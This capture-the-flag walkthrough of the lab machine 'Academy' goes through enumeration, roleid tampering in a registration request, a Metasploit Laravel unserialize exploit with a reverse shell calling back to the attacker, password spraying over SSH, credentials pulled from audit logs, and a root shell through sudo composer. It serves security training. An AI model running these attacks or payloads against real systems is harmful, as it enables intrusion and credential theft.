##### Tags: `brute force`  `burp suite`  `Metasploit`  `adm`  `composer'  `password spraying`

# 🐧Academy🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 10.129.244.182

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
33060/tcp open  mysqlx  MySQL X protocol listener
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
brute force port 80 we found some endpoint
```console
$ feroxbuster -u http://academy.htb -w /usr/share/wordlists/dirb/common.txt -x php,txt,xml,zip -C 404
200      GET      141l      226w     2627c http://academy.htb/login.php
200      GET      141l      227w     2633c http://academy.htb/admin.php
200      GET      148l      247w     3003c http://academy.htb/register.php
```
since we don't have credential  
we register a new account user:user send it to burp suite
```console
POST /register.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: http://academy.htb
Connection: keep-alive
Referer: http://academy.htb/register.php
Cookie: PHPSESSID=n7h6erm4i35idr5bp2t4e07r76
Upgrade-Insecure-Requests: 1
Priority: u=0, i

uid=user&password=user&confirm=user&roleid=0
```
we change to roleid to 1 and send it  
when we login as user we can see the Academy Launch Planner
```console
Fix issue with dev-staging-01.academy.htb 	pending
```
brower to http://dev-staging-01.academy.htb  
the webpage is running laravel which is vulnerable to CVE-2018-15133
```console
$ searchsploit laravel                     
PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution (Metas | linux/remote/47129.rb
```
found the Metasploit exploit
```console
msf > search laravel

Matching Modules
================

   #  Name                                                       Disclosure Date  Rank       Check  Description                        .                .          .      .
   6  exploit/unix/http/laravel_token_unserialize_exec           2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution
```
found the APP_KEY in the dev-staging-01.academy.htb  
set the payload and run it
```console
msf > use 6
[*] Using configured payload cmd/unix/reverse_perl
msf exploit(unix/http/laravel_token_unserialize_exec) > set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_KEY => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
msf exploit(unix/http/laravel_token_unserialize_exec) > set RHOSTS 10.129.244.182
RHOSTS => 10.129.244.182
msf exploit(unix/http/laravel_token_unserialize_exec) > set vhost dev-staging-01.academy.htb
vhost => dev-staging-01.academy.htb
msf exploit(unix/http/laravel_token_unserialize_exec) > set LHOST tun0
LHOST => tun0
msf exploit(unix/http/laravel_token_unserialize_exec) > set LPORT 443
LPORT => 443
msf exploit(unix/http/laravel_token_unserialize_exec) > run
```
logged in as www-data
```console
www-data@academy:/tmp$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Lateral Movement
found a password in /var/www/html/academy/.env 
```console
-rw-r--r-- 1 www-data www-data 706 Aug 13  2020 /var/www/html/academy/.env                                                          
DB_PASSWORD=mySup3rP4s5w0rd!!
```
found all users able to login
```console
www-data@academy:/tmp$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
egre55:x:1000:1000:egre55:/home/egre55:/bin/bash
mrb3n:x:1001:1001::/home/mrb3n:/bin/sh
cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh
21y4d:x:1003:1003::/home/21y4d:/bin/sh
ch4p:x:1004:1004::/home/ch4p:/bin/sh
g0blin:x:1005:1005::/home/g0blin:/bin/sh
```
put all in the list and password spraying  
found cry0l1t3:mySup3rP4s5w0rd!!
```console
$ nxc ssh 10.129.244.182 -u user.txt -p pass.txt
SSH         10.129.244.182  22     10.129.244.182   [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
SSH         10.129.244.182  22     10.129.244.182   [-] root:mySup3rP4s5w0rd!!
SSH         10.129.244.182  22     10.129.244.182   [-] egre55:mySup3rP4s5w0rd!!
SSH         10.129.244.182  22     10.129.244.182   [-] mrb3n:mySup3rP4s5w0rd!!
SSH         10.129.244.182  22     10.129.244.182   [+] cry0l1t3:mySup3rP4s5w0rd!!  Linux - Shell access!
```
logged in as cry0l1t3
```console
$ ssh cry0l1t3@10.129.244.182              
cry0l1t3@10.129.244.182's password: mySup3rP4s5w0rd!!

cry0l1t3@academy:~$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```
since cry0l1t3 is in adm group means we can read log file
upload linpeas and found credential in to logs mrb3n:mrb3n_Ac@d3my!
```console
╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>                                                                                  
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
```
su to mrb3n
```console
cry0l1t3@academy:/tmp$ su mrb3n
Password:mrb3n_Ac@d3my!

mrb3n@academy:/tmp$ id
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
```
sudo -l found mrb3n can run composer as root
```console
mrb3n@academy:/tmp$ sudo -l
User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```
```console
https://www.ddosi.org/gtfo/gtfobins/composer/index.html#shell
```
follow the step and got the root shell
```console
mrb3n@academy:/tmp$ TF=$(mktemp -d)
mrb3n@academy:/tmp$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > $TF/composer.json
mrb3n@academy:/tmp$ sudo /usr/bin/composer --working-dir=$TF run-script x
[sudo] password for mrb3n:


PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# id
uid=0(root) gid=0(root) groups=0(root)
```
